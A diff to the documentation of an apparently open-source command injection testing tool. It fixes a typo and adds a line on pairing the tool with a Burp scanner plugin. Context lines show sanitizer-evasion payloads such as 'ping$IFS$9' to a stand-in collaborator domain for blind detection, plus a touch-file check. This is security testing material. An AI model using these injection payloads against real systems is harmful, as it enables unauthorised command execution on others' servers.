@@ -196,7 +196,7 @@ In order to avoid false negatives, when no command output is returned by the app
 In such case, the only way (without involving third parties) to confirm that the injected command has executed, would be an injection of some sort of payload causing a Denial of
 Service condition (obviously not recommended if testing production systems :)).
 
-#### Feedback channel - ff all the above fails 
+#### Feedback channel - if all the above fails 
 If neither direct output, time delay nor network traffic indicated a successful command injection, we can perform one more test to be entirely sure. In this
 case we need cooperation from the application owner/custodian, as file system access is required to perform this verification step. 
 All we need is another set of payloads, this time with the `OS_COMMAND` set to touch and the `ARGUMENT` set to `/tmp/foo`. After attempting to create a file with the entire payload set, we examine the filesystem to check if a file named /tmp/foo has been created.
@@ -215,6 +215,8 @@ The `PAYLOAD_MARK` holder is either removed - or replaced with a unique payload 
 
 - `$COMMAND='ping'`, `$ARGUMENT='PAYLOAD_MARK.sub.evilcollab.org'` - this will generate commands like `ping$IFS$966.sub.evilcollab.org`. So, if this particular payload is successful, the nameserver responsible for serving the `*.sub.evilcollab.org` entries will receive a query to `66.sub.evilcollab.org` - so we know that the 66-th payload defeated the sanitizer.
 - `$COMMAND='touch'`, `$ARGUMENT='/tmp/fooPAYLOAD_MARK'` - this will generate commands like `touch$IFS$9/tmp/foo132` - so if a file /tmp/foo132 is created, we know that the 132-th payload did the trick.
+
+The tool can be used for detection directly - or in a hybrid approach, after identifying suspicious behaviours with Baskslash-powered Scanner Burp Plugin.
 
 ### Case examples
 #### 1) See the test_cases directory 
